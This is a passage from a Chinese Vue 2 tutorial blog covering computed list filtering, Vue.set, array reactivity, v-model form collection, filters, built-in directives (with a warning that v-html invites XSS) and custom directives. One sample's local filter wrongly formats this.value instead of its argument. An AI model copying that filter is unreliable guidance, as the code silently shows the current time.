class="hljs-string">&#x27;男&#x27;</span>&#125;,<br>      &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;004&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;温兆伦&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">22</span>,<span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;男&#x27;</span>&#125;<br>    ]<br>  &#125;,<br>  <span class="hljs-attr">computed</span>:&#123;<br>    <span class="hljs-title function_">filPersons</span>(<span class="hljs-params"></span>)&#123;<br>      <span class="hljs-keyword">const</span> arr = <span class="hljs-variable language_">this</span>.<span class="hljs-property">persons</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">p</span>)=&gt;</span>&#123;<br>        <span class="hljs-keyword">return</span> p.<span class="hljs-property">name</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">keyWord</span>) !== -<span class="hljs-number">1</span>   <br>      &#125;)<br>      <span class="hljs-comment">// 判断是否需要排序</span><br>      <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">sortType</span>)&#123;<br>        arr.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">p1,p2</span>)=&gt;</span>&#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">sortType</span> === <span class="hljs-number">1</span> ? p2.<span class="hljs-property">age</span>-p1.<span class="hljs-property">age</span> : p1.<span class="hljs-property">age</span>-p2.<span class="hljs-property">age</span><br>        &#125;)<br>      &#125;<br>      <span class="hljs-keyword">return</span> arr<br>    &#125;<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><h3 id="Vue监测数据原理"><a href="#Vue监测数据原理" class="headerlink" title="Vue监测数据原理"></a>Vue监测数据原理</h3><p>Vue会监视data中所有层次的数据。</p><h4 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h4><p>vue通过setter实现监视，切要new Vue时就传入要监测的对象。</p><ul><li><p>对象中后追加的属性，Vue默认不做响应式处理</p></li><li><p>如需给后添加的属性做响应式，请使用如下API</p><h3 id="Vue-set"><a href="#Vue-set" class="headerlink" title="Vue.set"></a>Vue.set</h3><p><strong><code>Vue.set( target, propertyName/index, value )</code></strong></p><p>vue提供的一个用于添加数据的全局Api。</p><p>实例方法：<code>vm.$set( target, propertyName/index, value )</code></p><p><strong>用法</strong>：向<strong>响应式对象</strong>中添加一个 property，并确保这个新 property <strong>同样是响应式的</strong>，且触发视图更新。它必须用于向响应式对象上添加新 property，因为 Vue 无法探测普通的新增 property (比如 <code>this.myObject.newProperty = &#39;hi&#39;</code>)</p><ul><li><strong>target（对象）不能是 Vue 实例，或者 Vue 实例的根数据对象（data）。</strong></li></ul><p>案例（添加属性sex）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">methods</span>: &#123;<br>  <span class="hljs-title function_">addSex</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-comment">// Vue.set(this.student,&#x27;sex&#x27;,&#x27;男&#x27;)</span><br>    <span class="hljs-variable language_">this</span>.$set(<span class="hljs-variable language_">this</span>.<span class="hljs-property">student</span>,<span class="hljs-string">&#x27;sex&#x27;</span>,<span class="hljs-string">&#x27;男&#x27;</span>)<br>  &#125;<br>&#125;,<br></code></pre></td></tr></table></figure></li></ul><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>通过包裹数组更新元素的方法实现。</p><p>本质做了两件事：</p><ol><li>调用原生对应的方法对数组进行更新</li><li>重新解析模板，进而更新页面</li></ol><p>Vue 将被侦听的<u>数组的变更方法进行了<strong>包裹</strong></u>，所以它们也将会触发视图更新。这些被包裹过的方法包括：</p><ul><li><code>push()</code></li><li><code>pop()</code></li><li><code>shift()</code></li><li><code>unshift()</code></li><li><code>splice()</code></li><li><code>sort()</code></li><li><code>reverse()</code></li></ul><h2 id="收集表单数据"><a href="#收集表单数据" class="headerlink" title="收集表单数据"></a>收集表单数据</h2><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-11-27%20%E4%B8%8A%E5%8D%8811.41.36.png" alt="收集表单数据案例" style="zoom:50%;" /><p>代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> @<span class="hljs-attr">submit.prevent</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span><br>            账号：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model.trim</span>=<span class="hljs-string">&quot;account&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>            密码：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>            年龄：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;number&quot;</span> <span class="hljs-attr">v-model.number</span>=<span class="hljs-string">&quot;age&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>            性别：<br>                男<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&#x27;sex&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;male&quot;</span>&gt;</span><br>                女<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&#x27;sex&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;female&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>            爱好：<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>                学习<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;hobby&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;student&quot;</span>&gt;</span><br>                打游戏<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;hobby&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;game&quot;</span>&gt;</span><br>                吃饭<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;hobby&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;eat&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>            所属校区：<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;city&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>请选择校区<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;bj&quot;</span>&gt;</span>北京<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;sz&quot;</span>&gt;</span>深圳<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;gz&quot;</span>&gt;</span>广州<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;sh&quot;</span>&gt;</span>上海<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>            其他信息： <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">v-model.lazy</span>=<span class="hljs-string">&quot;other&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;agree&quot;</span>&gt;</span><br>            阅读并接受<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>《用户协议》<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">account</span>:<span class="hljs-string">&#x27;&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">password</span>:<span class="hljs-string">&#x27;&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;male&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">hobby</span>:[],</span><br><span class="language-javascript">            <span class="hljs-attr">city</span>:<span class="hljs-string">&#x27;&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">other</span>:<span class="hljs-string">&#x27;&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">agree</span>:<span class="hljs-literal">false</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">age</span>:<span class="hljs-number">18</span>,</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">demo</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">_data</span>))</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><ul><li><p><code>&lt;input type=&quot;text&quot; /&gt;</code>，v-model收集的是value值</p></li><li><p><code>&lt;input type=&quot;radio&quot;/&gt;</code>,v-model收集的是value值</p></li><li><p><code>&lt;input type=&quot;checkbox&quot; /&gt;</code></p><p>若没有配置value属性，v-model收集的是checked(是否勾选，布尔值)</p><p>若配置</p><ul><li>若v-model的初始值是非数组，则收集checked</li><li>若v-model的初始值为数组，则收集value组成的数组</li></ul></li></ul><p>v-model的三个<strong>修饰符</strong>：</p><ul><li>lazy（懒惰）：失去焦点再收集数据</li><li>number：输入字符串转为有效的数字</li><li>trim：输入首位空格过滤</li></ul><p><strong>v-model.number</strong>：强制转换为数字类型</p><h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><h3 id="案例：显示格式化时间"><a href="#案例：显示格式化时间" class="headerlink" title="案例：显示格式化时间"></a>案例：显示格式化时间</h3><p>使用到的api：Dayjs](<a href="https://github.com/iamkun/dayjs.git">https://github.com/iamkun/dayjs.git</a>)</p><p>源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>显示格式化后的时间<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 计算属性实现 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>现在是：&#123;&#123;fmtTime&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- methods实现 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>现在是：&#123;&#123;getFmtTime()&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 过滤器实现 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>现在是：&#123;&#123;time | timeFormater&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 过滤器实现（传参） --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>现在是：&#123;&#123;time | timeFormater |mySlice&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root2&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>&#123;&#123;hello | mySlice&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">//全局过滤器（但要在newVue前）</span></span><br><span class="language-javascript">    <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-string">&#x27;mySlice&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> value.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>,<span class="hljs-number">4</span>)</span><br><span class="language-javascript">            &#125;)</span><br><span class="language-javascript">    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">time</span>:<span class="hljs-number">1701057166019</span></span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">computed</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">fmtTime</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> <span class="hljs-title function_">dayjs</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">time</span>).<span class="hljs-title function_">format</span>(<span class="hljs-string">&#x27;YYYY-MM-DD HH:mm:ss&#x27;</span>)</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">getFmtTime</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> <span class="hljs-title function_">dayjs</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">time</span>).<span class="hljs-title function_">format</span>(<span class="hljs-string">&#x27;YYYY-MM-DD HH:mm:ss&#x27;</span>)</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-comment">//局部过滤器</span></span><br><span class="language-javascript">        <span class="hljs-attr">filters</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">timeFormater</span>(<span class="hljs-params">value</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> <span class="hljs-title function_">dayjs</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>).<span class="hljs-title function_">format</span>(<span class="hljs-string">&#x27;YYYY-MM-DD HH:mm:ss&#x27;</span>)</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript">    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root2&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">hello</span>:<span class="hljs-string">&#x27;hello, Vue&#x27;</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-11-27%20%E4%B8%8B%E5%8D%8812.27.24.png" alt="页面效果" style="zoom:33%;" /><h3 id="过滤器-1"><a href="#过滤器-1" class="headerlink" title="过滤器"></a>过滤器</h3><p>对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。</p><p><strong>语法</strong>：</p><ol><li>注册过滤器：<code>Vue.filter(name,callback)</code>或<code>new Vue&#123;filters:&#123;&#125;&#125;</code></li><li>使用过滤器:<code>&#123;&#123;xxx | 过滤器名&#125;&#125;</code> 或 <code>v-bind:属性 = &quot;xxx| 过滤器名&quot;</code></li></ol><p>过滤器也可以接受额外参数，多个过滤器可以串联。</p><p>使用过滤器并没有改变原本的数据，是产生新的对应的数据。</p><h2 id="内置指令"><a href="#内置指令" class="headerlink" title="内置指令"></a>内置指令</h2><ul><li><p><strong>v-text</strong>：向其所在的节点中渲染文本内容</p><p>与插值语法的区别：v-text会替换掉节点中的内容，则不会。</p></li><li><p><strong>v-html</strong>：向指定节点中渲染包含html结构的内容</p><p>与插值语法的区别</p><ol><li>v-html 会替换掉节点中所有的内容，则不会</li><li>v-html可以识别html结构</li></ol><p><strong>注意</strong>：v-html具有<strong>安全性问题</strong>！在网站上动态渲染任意html，容易导致xss攻击。一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上。</p></li><li><p><strong>v-cloak：</strong>特殊属性，没有值。Vue实例创建完毕并接管容器后，会删掉v-cloak属性。</p><p>结合css使用可以解决网速慢时页面直接展示出结构的问题。</p></li><li><p><strong>v-once</strong>：在初次渲染后，视为静态内容。</p><p>以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。</p></li><li><p><strong>v-pre</strong>：跳过其所在节点的编译过程。</p><p>可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。</p></li></ul><h2 id="自定义指令"><a href="#自定义指令" class="headerlink" title="自定义指令"></a>自定义指令</h2><h3 id="案例：定义两个自定义指令"><a href="#案例：定义两个自定义指令" class="headerlink" title="案例：定义两个自定义指令"></a>案例：定义两个自定义指令</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- </span><br><span class="hljs-comment">需求1:定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。</span><br><span class="hljs-comment">需求2:定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>当前的n值是：<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-text</span>=<span class="hljs-string">&#x27;n&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>放大10倍的n值是：<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-big</span>=<span class="hljs-string">&#x27;n&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-fbind:value</span>=<span class="hljs-string">&quot;n&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">n</span>:<span class="hljs-number">1</span></span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">directives</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-comment">// big函数何时会被调用？</span></span><br><span class="language-javascript">            <span class="hljs-comment">// 1.指令和元素成功绑定</span></span><br><span class="language-javascript">            <span class="hljs-comment">// 2.指令所在的模板被重新解析时</span></span><br><span class="language-javascript">            <span class="hljs-title function_">big</span>(<span class="hljs-params">element,binding</span>)&#123;</span><br><span class="language-javascript">                element.<span class="hljs-property">innerText</span> = binding.<span class="hljs-property">value</span>*<span class="hljs-number">10</span></span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">fbind</span>:&#123;</span><br><span class="language-javascript">                <span class="hljs-comment">// 指令与元素成功绑定时调用</span></span><br><span class="language-javascript">                <span class="hljs-title function_">bind</span>(<span class="hljs-params">element,binding</span>)&#123;</span><br><span class="language-javascript">                    element.<span class="hljs-property">value</span> = binding.<span class="hljs-property">value</span>  </span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-comment">// 指令所在元素被插入页面时调用</span></span><br><span class="language-javascript">                <span class="hljs-title function_">inserted</span>(<span class="hljs-params">element,binding</span>)&#123;</span><br><span class="language-javascript">                    element.<span class="hljs-title function_">focus</span>()</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-comment">// 指令所在的模板被重新解析</span></span><br><span class="language-javascript">                <span class="hljs-title function_">update</span>(<span class="hljs-params">element,binding</span>)&#123;</span><br><span class="language-javascript">                    element.<span class="hljs-property">value</span> = binding.<span class="hljs-property">value</span>  </span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="自定义指令-1"><a href="#自定义指令-1" class="headerlink" 